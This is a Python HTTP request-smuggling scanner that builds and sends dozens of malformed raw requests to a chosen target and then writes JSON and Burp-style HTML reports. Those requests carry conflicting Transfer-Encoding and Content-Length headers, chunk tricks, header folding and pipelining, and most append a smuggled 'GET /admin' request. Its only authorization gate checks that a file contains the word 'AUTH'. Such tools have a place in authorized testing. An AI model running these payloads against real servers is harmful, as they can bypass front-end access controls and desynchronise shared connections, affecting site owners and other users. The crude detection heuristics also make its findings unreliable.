#!/usr/bin/python
"""
HTTP Desync (Request Smuggling) Scanner - upgraded + advanced payloads + Burp-like HTML report
by nu11secur1ty 2025 (patched)

Notes:
- Legacy + expanded payloads + additional deep templates (chunk tricks, LF-only,
  folded headers, Expect:100, pipelined requests, HTTP/1.0, absolute-URI, etc.)
- Supports --proxy (host:port). For HTTPS target with proxy the script uses CONNECT then TLS.
- Safety: requires --auth-file containing the word 'AUTH' (unless you add an explicit bypass).
- HTML report now includes Burp-like collapsible request/response panels and "Copy Request" buttons.
"""
from __future__ import annotations
import argparse
import socket
import ssl
import time
import json
import html
import sys
import logging
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Dict, Optional

CRLF = "\r\n"
DEFAULT_USER_AGENT = "DesyncScanner/1.4"
logger = logging.getLogger("desync-scanner")


# -----------------------
# Logging / utilities
# -----------------------
def setup_logging(verbose: bool = False) -> None:
    handler = logging.StreamHandler()
    fmt = "[%(levelname)s] %(message)s"
    handler.setFormatter(logging.Formatter(fmt))
    logger.handlers = []
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)


def safe_read_file(path: str) -> str:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        logger.debug("Cannot read file %s: %s", path, e)
        return ""


def require_auth_file(path: str) -> bool:
    content = safe_read_file(path)
    return "AUTH" in content.upper()


def parse_indicator_list(s: Optional[str]) -> List[str]:
    if not s:
        return []
    return [p.strip() for p in s.split(",") if p.strip()]


# -----------------------
# Payload helpers
# -----------------------
def join_lines(lines: List[str], trailing_body: bytes = b"") -> bytes:
    """Join header lines with CRLF and append the trailing body bytes."""
    return CRLF.join(lines).encode("utf-8") + CRLF.encode("utf-8") + trailing_body


# -----------------------
# Payload collection (expanded + legacy)
# -----------------------
def payload_te_cl(host: str, path: str = "/") -> bytes:
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "Content-Length: 4",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    return join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))


def payload_cl_te(host: str, path: str = "/") -> bytes:
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 20",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    return join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))


def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # duplicate with zero / formatted zero
    l1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 0",
        "content-length: 0000",
        "",
    ]
    variants.append(("dup_cl_0_0000", join_lines(l1)))
    # duplicate different values
    l2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 4",
        "Content-Length: 1000",
        "",
    ]
    variants.append(("dup_cl_4_1000", join_lines(l2)))
    # many duplicates (three)
    l3 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 2",
        "Content-Length: 2",
        "content-length: 02",
        "",
    ]
    variants.append(("dup_cl_three", join_lines(l3, b"AB")))
    return variants


def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # trailing space
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 5 ",
        "",
    ]
    variants.append(("ws_trailing_space", join_lines(lines1, b"hello")))
    # mixed-case header
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "transfer-encoding: chunked",
        "",
    ]
    variants.append(("te_lowercase", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    # odd capitalization combo
    lines3 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: Chunked",
        "Content-Length: 4",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    variants.append(("te_cap_cl_ambig", join_lines(lines3, body.encode("utf-8") + poison.encode("utf-8"))))
    return variants


def payload_mixed_transfer(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # gzip, chunked combined
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: gzip, chunked",
        "",
    ]
    variants.append(("mix_te_gzip_chunked", join_lines(lines, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    # duplicate TE lines
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "Transfer-Encoding: identity",
        "",
    ]
    variants.append(("dup_te_chunked_identity", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    return variants


def payload_chunk_tricks(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # small chunk then poison
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "1\r\nA\r\n0\r\n\r\n"
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    variants.append(("small_chunk_poison", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
    # chunk extension
    body2 = "5;ext=1\r\nHELLO\r\n0\r\n\r\n"
    variants.append(("chunk_ext", join_lines(lines, body2.encode("utf-8") + poison.encode("utf-8"))))
    # extra CRLFs around terminator
    body3 = "0" + CRLF + CRLF + CRLF
    variants.append(("extra_crlf_terminator", join_lines(lines, body3.encode("utf-8") + poison.encode("utf-8"))))
    return variants


def payload_cl_mismatch(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # big content-length declared, small body + poison
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 100",
        "",
    ]
    body_and_poison = b"A" * 4 + (f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}").encode("utf-8")
    variants.append(("cl_too_large_then_poison", join_lines(lines1, body_and_poison)))
    # small content-length but long extra bytes
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 4",
        "",
    ]
    extra = b"A" * 8 + (f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}").encode("utf-8")
    variants.append(("cl_too_small_extra_then_poison", join_lines(lines2, extra)))
    return variants


def payload_http2_to_http1_hints(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 12",
        "",
    ]
    body = b":method: GET\r\n:path: /admin\r\n"
    variants.append(("http2_pseudo_in_body", join_lines(lines, body)))
    return variants


# -----------------------
# Advanced / Deep payloads (new)
# -----------------------
def payload_lf_only(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates: List[Tuple[str, bytes]] = []
    req_lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: 4",
        "",
    ]
    raw = "\n".join(req_lines).encode("utf-8") + b"\n" + b"ABCD"
    templates.append(("lf_only_cl", raw))
    z = "Transfer-Encoding: chunked\n\n1\nA\n0\n\nGET /admin HTTP/1.1\nHost: %s\n\n" % host
    templates.append(("lf_only_te_chunked_poison", z.encode("utf-8")))
    return templates


def payload_chunk_upper_hex_and_garbage(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "A\r\n0123456789\r\n0\r\nGARBAGE\r\n"
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    templates.append(("chunk_upper_hex_garbage", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
    return templates


def payload_missing_final_crlf(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "1\r\nA\r\n0\r\n"  # missing final \r\n
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    templates.append(("missing_final_crlf", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
    return templates


def payload_folded_headers_and_obs_fold(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: 5",
        "X-Header: part1",
        " part2",  # folded continuation line (obs-fold)
        "",
    ]
    templates.append(("obs_fold_cl", join_lines(lines, b"hello")))
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: 0",
        "X-Fold: value",
        "\tcontinuation",
        "",
    ]
    templates.append(("obs_fold_tab", join_lines(lines2)))
    return templates


def payload_expect_100_continue_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Expect: 100-continue",
        "Content-Length: 4",
        "",
    ]
    templates.append(("expect_cl", join_lines(lines1, b"ABCD")))

    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: {DEFAULT_USER_AGENT}",
        "Expect: 100-continue",
        "Transfer-Encoding: chunked",
        "Content-Length: 4",
        "",
    ]
    body = "0\r\n\r\n"
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    templates.append(("expect_te_cl_ambig", join_lines(lines2, body.encode("utf-8") + poison.encode("utf-8"))))
    return templates


def payload_negative_and_non_numeric_cl(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: -1",
        "",
    ]
    templates.append(("cl_negative", join_lines(lines1, b"")))
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: abc",
        "",
    ]
    templates.append(("cl_non_numeric", join_lines(lines2, b"")))
    return templates


def payload_pipelined_multiple_requests(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    control = f"GET / HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    ambiguous = (
        f"POST {path} HTTP/1.1{CRLF}"
        f"Host: {host}{CRLF}"
        "User-Agent: DesyncScanner/1.4\r\n"
        "Content-Length: 100\r\n"
        "\r\n"
        "ABCD"
    )
    raw = control.encode("utf-8") + ambiguous.encode("utf-8")
    templates.append(("pipelined_control_then_ambig", raw))

    post = (
        f"POST {path} HTTP/1.1{CRLF}"
        f"Host: {host}{CRLF}"
        "User-Agent: DesyncScanner/1.4\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "ABCD"
    )
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    templates.append(("pipelined_post_then_poison", (post + poison).encode("utf-8")))
    return templates


def payload_multiple_connection_headers(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Connection: keep-alive",
        "Connection: close",
        "Content-Length: 0",
        "",
    ]
    templates.append(("dup_connection_keep_close", join_lines(lines)))
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Connection: keep-alive",
        "Transfer-Encoding: chunked",
        "",
    ]
    templates.append(("conn_keep_te_chunked", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    return templates


def payload_http10_and_absolute_uri(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates = []
    lines = [
        f"POST {path} HTTP/1.0",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: 4",
        "",
    ]
    templates.append(("http10_cl", join_lines(lines, b"ABCD")))
    abs_req = [
        f"POST http://{host}{path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: DesyncScanner/1.4",
        "Content-Length: 0",
        "",
    ]
    templates.append(("absolute_uri_cl", join_lines(abs_req)))
    return templates


def advanced_payloads(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates: List[Tuple[str, bytes]] = []
    templates.extend(payload_lf_only(host, path))
    templates.extend(payload_chunk_upper_hex_and_garbage(host, path))
    templates.extend(payload_missing_final_crlf(host, path))
    templates.extend(payload_folded_headers_and_obs_fold(host, path))
    templates.extend(payload_expect_100_continue_variants(host, path))
    templates.extend(payload_negative_and_non_numeric_cl(host, path))
    templates.extend(payload_pipelined_multiple_requests(host, path))
    templates.extend(payload_multiple_connection_headers(host, path))
    templates.extend(payload_http10_and_absolute_uri(host, path))
    return templates


# -----------------------
# Aggregate all payloads (include advanced)
# -----------------------
def payload_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    templates: List[Tuple[str, bytes]] = []
    templates.append(("te_cl", payload_te_cl(host, path)))
    templates.append(("cl_te", payload_cl_te(host, path)))
    templates.extend(payload_dup_cl_variants(host, path))
    templates.extend(payload_whitespace_case(host, path))
    templates.extend(payload_mixed_transfer(host, path))
    templates.extend(payload_chunk_tricks(host, path))
    templates.extend(payload_cl_mismatch(host, path))
    templates.extend(payload_http2_to_http1_hints(host, path))
    # append new deeper templates
    templates.extend(advanced_payloads(host, path))

    # some small legacy extras
    extra = []
    extra.append(f"POST {path} HTTP/1.1")
    extra.append(f"Host: {host}")
    extra.append("User-Agent: DesyncScanner/1.4")
    extra.append("CONTENT-LENGTH: 0")
    extra.append("Content-Length: 0000")
    extra.append("")
    templates.append(("dup_cl_mixedcase", CRLF.join(extra).encode('utf-8') + CRLF.encode('utf-8')))
    return templates


# -----------------------
# Networking: raw socket + proxy support
# -----------------------
def send_raw(host: str, port: int, raw: bytes, use_ssl: bool=False, timeout: float=6.0, proxy: Optional[str]=None) -> Tuple[int, bytes]:
    proxy_host = proxy_port = None
    if proxy:
        try:
            proxy_host, proxy_port = proxy.split(":",1)
            proxy_port = int(proxy_port)
        except Exception as e:
            return (1, f"Invalid proxy format: {e}".encode('utf-8'))

    sock = None
    try:
        if proxy:
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            if use_ssl:
                connect_cmd = f"CONNECT {host}:{port} HTTP/1.1{CRLF}Host: {host}:{port}{CRLF}{CRLF}"
                sock.sendall(connect_cmd.encode('utf-8'))
                resp = b""
                sock.settimeout(timeout)
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"\r\n\r\n" in resp:
                        break
                if b"200" not in resp.split(b"\r\n",1)[0]:
                    sock.close()
                    return (1, b"Proxy CONNECT failed: " + resp[:1024])
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.settimeout(timeout)
                sock.sendall(raw)
            else:
                try:
                    raw_str = raw.decode('utf-8', errors='replace')
                    first_line, rest = raw_str.split("\r\n",1)
                    parts = first_line.split(" ",2)
                    if len(parts) >= 2:
                        method = parts[0]
                        path = parts[1]
                        abs_url = f"http://{host}:{port}{path}"
                        new_first = f"{method} {abs_url} HTTP/1.1"
                        new_raw = new_first + "\r\n" + rest
                        sock.sendall(new_raw.encode('utf-8'))
                    else:
                        sock.sendall(raw)
                except Exception:
                    sock.sendall(raw)
        else:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            sock.sendall(raw)

        chunks = []
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass
        try:
            sock.close()
        except Exception:
            pass
        return (0, b"".join(chunks))
    except Exception as exc:
        try:
            if sock:
                sock.close()
        except Exception:
            pass
        return (1, str(exc).encode('utf-8'))


# -----------------------
# Analysis heuristics
# -----------------------
def analyze_response(template_name: str, sent: bytes, resp_bytes: bytes, indicators: Optional[List[str]]=None, large_threshold: int=15000) -> Dict:
    if indicators is None:
        indicators = []
    findings: Dict = {
        'template': template_name,
        'resp_len': len(resp_bytes),
        'resp_preview': resp_bytes[:2048].decode('latin-1', errors='replace'),
        'suspected': False,
        'reasons': [],
        'severity': 'green',
    }
    lower = resp_bytes.lower()
    if b'http/1.1' in lower[4:]:
        findings['suspected'] = True
        findings['reasons'].append('multiple_http_markers_in_response')
        if findings['severity'] == 'green':
            findings['severity'] = 'yellow'
    if len(resp_bytes) > large_threshold:
        findings['suspected'] = True
        findings['reasons'].append('very_large_response')
        if findings['severity'] == 'green':
            findings['severity'] = 'yellow'
    if b'/admin' in lower or b'admin' in lower:
        findings['suspected'] = True
        findings['reasons'].append('admin_string_in_response')
        findings['severity'] = 'red'
    for ind in indicators:
        if ind and ind.encode('utf-8').lower() in lower:
            findings['suspected'] = True
            findings['reasons'].append(f'indicator:{ind}')
            if findings['severity'] == 'green':
                findings['severity'] = 'yellow'
    return findings


# -----------------------
# HTML report generator (Burp-like light theme)
# -----------------------
def severity_badge_html(sev: str) -> str:
    if sev == 'red':
        color = '#b22222'; textcol = '#fff'
    elif sev == 'yellow':
        color = '#f39c12'; textcol = '#111'
    else:
        color = '#27ae60'; textcol = '#fff'
    return f'<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:{color};color:{textcol};font-weight:700;">{sev.upper()}</span>'


def extract_request_meta(req_text: str) -> Tuple[str, str]:
    """Return (method, path) from request start-line, fallback to blanks."""
    try:
        first = req_text.splitlines()[0]
        parts = first.split(" ", 2)
        if len(parts) >= 2:
            return parts[0], parts[1]
        return first, ""
    except Exception:
        return "", ""


def generate_html_report(report: Dict, html_path: str) -> None:
    counts = {'red': 0, 'yellow': 0, 'green': 0}
    for r in report.get('results', []):
        sev = r.get('severity', 'green')
        counts[sev] = counts.get(sev, 0) + 1

    rows = []
    idx = 0
    for r in report.get('results', []):
        idx += 1
        sev = r.get('severity', 'green')
        badge = severity_badge_html(sev)
        reasons = ', '.join(r.get('reasons', [])) or 'None'
        resp_preview = r.get('resp_preview', '')
        # include full response if available; prefer full_response else resp_preview
        full_resp = r.get('response_full', resp_preview)
        req_sent = r.get('request_sent', '')
        method, path = extract_request_meta(req_sent or "")
        status_line = ""
        if full_resp:
            status_line = full_resp.splitlines()[0] if full_resp.splitlines() else ""
        border = '#b22222' if sev == 'red' else ('#f39c12' if sev == 'yellow' else '#27ae60')

        row = f"""
        <div class="req-card" style="border:1px solid #e6e9ee;border-left:6px solid {border};border-radius:8px;padding:12px;margin:8px 0;background:#fff;">
          <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;">
            <div style="font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;font-size:14px;font-weight:700;">
              <span style="background:#eef2f7;padding:6px 10px;border-radius:6px;margin-right:8px;font-weight:700;color:#0b1220">{html.escape(method or '')}</span>
              <span style="font-weight:600;color:#334">{html.escape(path or '')}</span>
              <span style="color:#666;font-weight:400;margin-left:8px;font-size:12px;">{html.escape(status_line)}</span>
            </div>
            <div style="display:flex;gap:8px;align-items:center;">
              <div style="font-size:12px;color:#666;margin-right:8px">Severity</div>
              <div>{badge}</div>
              <button onclick="togglePanel('panel-{idx}')" style="padding:6px 10px;border-radius:6px;border:1px solid #ddd;background:#fff;cursor:pointer">Toggle</button>
              <button onclick="copyToClipboard('req-{idx}')" style="padding:6px 10px;border-radius:6px;border:1px solid #ddd;background:#fff;cursor:pointer">Copy Request</button>
            </div>
          </div>

          <div id="panel-{idx}" style="margin-top:10px;display:none;">
            <div style="display:flex;gap:12px;">
              <div style="flex:1">
                <div style="font-weight:700;margin-bottom:6px;color:#333">Request (raw)</div>
                <pre id="req-{idx}" style="background:#0f1720;color:#e6eef6;padding:12px;border-radius:6px;overflow:auto;white-space:pre-wrap;font-family:monospace;">{html.escape(req_sent or '')}</pre>
              </div>
              <div style="flex:1">
                <div style="font-weight:700;margin-bottom:6px;color:#333">Response (preview)</div>
                <pre style="background:#f7f8fa;color:#0b1220;padding:12px;border-radius:6px;overflow:auto;white-space:pre-wrap;font-family:monospace;">{html.escape(full_resp or '')}</pre>
              </div>
            </div>
            <div style="margin-top:8px;color:#666;font-size:13px;">Reasons: {html.escape(reasons)} | Response length: {r.get('resp_len')}</div>
          </div>
        </div>
        """
        rows.append(row)

    html_doc = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>HTTP Desync Scanner Report - {html.escape(report.get('target',''))}</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body {{background:#f6f8fa;padding:20px;font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;color:#0b1220}}
    .header {{display:flex;justify-content:space-between;align-items:center;gap:16px}}
    .card {{background:#fff;border-radius:12px;padding:16px;box-shadow:0 4px 16px rgba(11,17,32,0.04);}}
    .summary-item {{display:inline-block;padding:10px 12px;border-radius:8px;margin-right:8px;font-weight:700}}
    pre {{font-size:13px;line-height:1.2}}
    button {{font-size:13px}}
  </style>
</head>
<body>
  <div class="card header" style="margin-bottom:12px;">
    <div>
      <h2 style="margin:0 0 6px 0">HTTP Desync Scanner Report</h2>
      <div style="color:#556">Target: {html.escape(report.get('target',''))}:{report.get('port')}  Path: {html.escape(report.get('path','/'))}  Generated: {html.escape(time.ctime(report.get('timestamp', time.time())))}</div>
    </div>
    <div style="text-align:right">
      <div style="font-size:12px;color:#666;margin-bottom:6px">Severity summary</div>
      <div>
        <span class="summary-item" style="background:#fdecea;color:#a61e14">RED: {counts['red']}</span>
        <span class="summary-item" style="background:#fff6e0;color:#8a6d00">YELLOW: {counts['yellow']}</span>
        <span class="summary-item" style="background:#eafaf1;color:#086f39">GREEN: {counts['green']}</span>
      </div>
    </div>
  </div>

  <div>
    {''.join(rows)}
  </div>

  <script>
    function togglePanel(id) {{
      var el = document.getElementById(id);
      if (!el) return;
      el.style.display = (el.style.display === 'none') ? 'block' : 'none';
    }}
    function copyToClipboard(id) {{
      var el = document.getElementById(id);
      if (!el) return;
      // create a temporary textarea to copy full text (preserve newlines)
      var ta = document.createElement('textarea');
      ta.value = el.textContent;
      document.body.appendChild(ta);
      ta.select();
      try {{
        document.execCommand('copy');
        // visual feedback
        var old = el.style.backgroundColor;
        el.style.backgroundColor = '#2b6cb0';
        setTimeout(function() {{ el.style.backgroundColor = old; }}, 300);
      }} catch (e) {{
        alert('Copy failed: ' + e);
      }}
      document.body.removeChild(ta);
    }}
  </script>
</body>
</html>
"""
    try:
        with open(html_path, 'w', encoding='utf-8') as fh:
            fh.write(html_doc)
        logger.info("HTML report written to %s", html_path)
    except Exception as e:
        logger.error("Failed to write HTML report: %s", e)


# -----------------------
# Scanner core
# -----------------------
def scan_target(host: str, port: int, path: str, use_ssl: bool, concurrency: int, timeout: float, proxy: Optional[str], indicators: List[str], large_threshold: int, templates_only: bool=False) -> Dict:
    templates = payload_variants(host, path)
    results = []

    def worker(name_raw: Tuple[str, bytes]) -> Dict:
        name, raw = name_raw
        status, resp = send_raw(host, port, raw, use_ssl=use_ssl, timeout=timeout, proxy=proxy)
        if status != 0:
            return {
                'template': name,
                'error': resp.decode('utf-8', errors='replace'),
                'resp_len': 0,
                'resp_preview': '',
                'suspected': False,
                'reasons': [],
                'severity': 'green',
                'request_sent': raw.decode('latin-1', errors='replace'),
                'response_full': resp.decode('latin-1', errors='replace'),
            }
        analysis = analyze_response(name, raw, resp, indicators, large_threshold)
        # attach raw request + full response to result for HTML export / analysis
        analysis['request_sent'] = raw.decode('latin-1', errors='replace')
        analysis['response_full'] = resp.decode('latin-1', errors='replace')
        return analysis

    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = {ex.submit(worker, t): t[0] for t in templates}
        for fut in as_completed(futures):
            try:
                r = fut.result()
            except Exception as e:
                r = {
                    'template': futures[fut],
                    'error': str(e),
                    'resp_len': 0,
                    'resp_preview': '',
                    'suspected': False,
                    'reasons': [],
                    'severity': 'green',
                    'request_sent': '',
                    'response_full': '',
                }
            results.append(r)

    report = {
        'target': host,
        'port': port,
        'path': path,
        'use_ssl': use_ssl,
        'timestamp': int(time.time()),
        'results': results,
    }
    return report


# -----------------------
# CLI
# -----------------------
def create_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="HTTP Desync (Request Smuggling) Scanner — upgraded")
    p.add_argument('--target', required=True, help='Target hostname or IP')
    p.add_argument('--port', type=int, default=80, help='TCP port (default 80)')
    p.add_argument('--path', default='/', help='Path used in templates')
    p.add_argument('--ssl', action='store_true', help='Use TLS (HTTPS)')
    p.add_argument('--proxy', default=None, help='Optional proxy host:port (use Burp at 127.0.0.1:8080)')
    p.add_argument('--concurrency', type=int, default=4)
    p.add_argument('--timeout', type=float, default=8.0)
    p.add_argument('--auth-file', required=True, help='File proving authorization (must contain AUTH)')
    p.add_argument('--out', default='desync_report.json', help='JSON output file')
    p.add_argument('--html', default=None, help='HTML output file (optional)')
    p.add_argument('--dry-run', action='store_true', help='List templates only')
    p.add_argument('--indicators', default=None, help='Comma-separated strings to flag (e.g. admin,reset,password)')
    p.add_argument('--large-threshold', type=int, default=15000, help='Bytes considered "very large"')
    p.add_argument('--verbose', action='store_true')
    return p


def main(argv: Optional[List[str]] = None) -> None:
    parser = create_parser()
    args = parser.parse_args(argv)
    setup_logging(args.verbose)

    # safety
    if not args.auth_file or not require_auth_file(args.auth_file):
        logger.error("Auth file missing/invalid. Place a file containing 'AUTH' to confirm permission.")
        sys.exit(2)

    if args.dry_run:
        tpls = payload_variants(args.target, args.path)
        print(json.dumps({'target': args.target, 'port': args.port, 'templates': [t[0] for t in tpls]}, indent=2))
        return

    indicators = parse_indicator_list(args.indicators)
    logger.info("Starting scan %s:%d%s (ssl=%s) proxy=%s", args.target, args.port, args.path, args.ssl, args.proxy)

    report = None
    try:
        report = scan_target(args.target, args.port, args.path, args.ssl, args.concurrency, args.timeout, args.proxy, indicators, args.large_threshold)
    except Exception as exc:
        logger.exception("Scan failed with an unexpected error: %s", exc)
        report = {
            "target": args.target,
            "port": args.port,
            "path": args.path,
            "use_ssl": args.ssl,
            "timestamp": int(time.time()),
            "error": f"Scan failed: {str(exc)}",
            "results": []
        }

    # Ensure output directory exists
    try:
        out_dir = os.path.dirname(args.out) or "."
        if out_dir and not os.path.exists(out_dir):
            os.makedirs(out_dir, exist_ok=True)
    except Exception as e:
        logger.error("Failed to ensure output directory exists (%s): %s", out_dir, e)

    # Write JSON report (always attempt — even if scan failed we write minimal report)
    try:
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2)
        logger.info("JSON report written to %s", args.out)
    except Exception as e:
        logger.error("Failed to write JSON report to %s: %s", args.out, e)
        # fallback: print a compact JSON to stdout for troubleshooting
        try:
            print("FALLBACK JSON REPORT:", json.dumps(report, indent=2))
        except Exception:
            logger.error("Also failed to print fallback JSON report.")

    # HTML output (optional) — try but do not crash if it fails
    if args.html:
        try:
            generate_html_report(report, args.html)
            logger.info("HTML report written to %s", args.html)
        except Exception as e:
            logger.error("Failed to write HTML report: %s", e)

    # summary
    for r in report.get('results', []):
        if r.get('suspected'):
            logger.info("Suspected: %s reasons=%s severity=%s", r.get('template'), r.get('reasons'), r.get('severity'))
    logger.info("Scan finished. JSON=%s HTML=%s", args.out, args.html or 'none')


if __name__ == '__main__':
    main()
